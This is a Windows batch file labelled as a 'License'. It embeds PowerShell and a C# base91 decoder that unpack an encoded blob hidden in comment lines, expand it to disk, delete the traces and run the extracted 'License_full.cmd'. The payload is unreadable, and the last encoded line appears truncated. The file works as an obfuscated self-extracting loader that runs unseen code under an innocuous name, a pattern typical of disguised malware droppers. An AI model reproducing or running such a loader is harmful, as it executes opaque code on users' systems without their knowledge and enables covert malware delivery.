@echo off &chcp 850 >nul &pushd "%~dp0"
@set "0=%~f0" &powershell -nop -c $f=[IO.File]::ReadAllText($env:0)-split':license\:.*';iex($f[1]); X(1) >nul
cmd.exe /c License_full.cmd
:license: License v6.5
$k='L,2WM*P+)jVEdAZ{tS.<Tz9DueQ0\UpF(a3C6[kOI#b>ylw|?^$K@X=4%f;q/m8Y_!5GBvn&1h-c~HNs]xrRg7`iJo}';Add-Type -Ty @'
using System.IO;public class BAT91{public static void Dec(ref string[] f,int x,string fo,string key){unchecked{int n=0,c=255,q=0
,v=91,z=f[x].Length; byte[]b91=new byte[256]; while(c>0) b91[c--]=91; while(c<91) b91[key[c]]=(byte)c++; using (FileStream o=new
FileStream(fo,FileMode.Create)){for(int i=0;i!=z;i++){c=b91[f[x][i]]; if(c==91)continue; if(v==91){v=c;}else{v+=c*91;q|=v<<n;if(
(v&8191)>88){n+=13;}else{n+=14;}v=91;do{o.WriteByte((byte)q);q>>=8;n-=8;}while(n>7);}}if(v!=91)o.WriteByte((byte)(q|v<<n));} }}}
'@; cd -Lit($env:__CD__); function X([int]$x=1){[BAT91]::Dec([ref]$f,$x+1,$x,$k); expand -R $x -F:* .; del $x -force}

:license:[ License_full_cmd
::0=g$SLLLnN$LLLLLLL>{LLLLLLLLH2)L(LLLCO),LLY,LL_LI)(u/,LLLLLLLLDEw{]+k,5Q=jgXtx%`LY?8e1s3#dWLU^mAF\[!7mK9}.2L`x.LLL|GBu2}vDV*0v1FO^,PjuN=2EFM9}g?hKxA!T){=qPX.o!Q,}c2MLQ.LL16PLL9krkZbK.`vAPAve.Dko,#~979|VJdu?kG9oIsI*b3LLLL?L{Cb3G|qx9Sji`sn=f?_9K~OY)mhq0v@]IW{_.bXOqEp\^N(^mW8YVw4W?nD!To.ESM^I_6bSn/~ZOa$qsk*^3@L[kXl]1^L~Pf6DSFUTIj]f0]P?R>iV{jQF$nIU?IU%;r8#|A]ENa\]_LQM8LVBga}((DfKARH5|9Lobm)2/S\t>BbtKGeg0%)@H8_t{*n=n@5j&FGM3&/aw[;qnqfR2OPxY8>&!KBx4;HGJv51/!\r/3C+?6M.!3`&BU[IdPjk$p$Wt`b#Ycz-t{gL]M
:license:]
